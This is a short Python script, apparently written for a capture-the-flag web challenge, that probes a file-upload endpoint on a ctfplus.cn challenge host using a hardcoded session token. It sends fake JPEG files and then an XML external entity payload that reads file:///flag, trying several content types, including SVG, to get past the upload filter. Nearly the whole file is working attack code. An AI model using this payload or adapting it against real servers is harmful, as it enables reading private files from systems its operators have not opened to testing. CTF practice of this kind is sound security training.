import requests

url = 'http://80-3829ff0b-6e88-4697-9c89-87d2b7b04632.challenge.ctfplus.cn/upload.php'
cookies = {'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3MDY3MTJ9.CqErZOY8Ac-MBNgnLOXKu8G1WJlUzOIcrIkpu9ji6gA'}

# 创建一个包含 XML 的图片文件（实际上是一个简单的 JPEG 文件）
jpeg_magic = b'\xff\xd8\xff\xe0\x00\x10JFIF'

# 1. 尝试上传包含 XXE 的文件
filenames = ['test.jpg', 'xxe.jpg', 'evil.jpg', 'image.jpg']

for filename in filenames:
    print(f"\n=== Testing filename: {filename} ===")

    # 创建文件
    files = {'file': (filename, jpeg_magic, 'image/jpeg')}

    try:
        resp = requests.post(url, files=files, cookies=cookies, timeout=5)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text}")

    except Exception as e:
        print(f"Error: {e}")

# 2. 尝试上传 XML 文件
print("\n=== Testing XML upload ===")
xml_content = """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
<data>&xxe;</data>"""

# 尝试不同的 Content-Type
content_types = [
    'image/jpeg',
    'image/png',
    'text/xml',
    'application/xml',
    'image/svg+xml',  # SVG 可能被解析为 XML
]

for ct in content_types:
    print(f"\nContent-Type: {ct}")
    files = {'file': ('test.xml', xml_content.encode(), ct)}

    try:
        resp = requests.post(url, files=files, cookies=cookies, timeout=5)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:200]}")

    except Exception as e:
        print(f"Error: {e}")
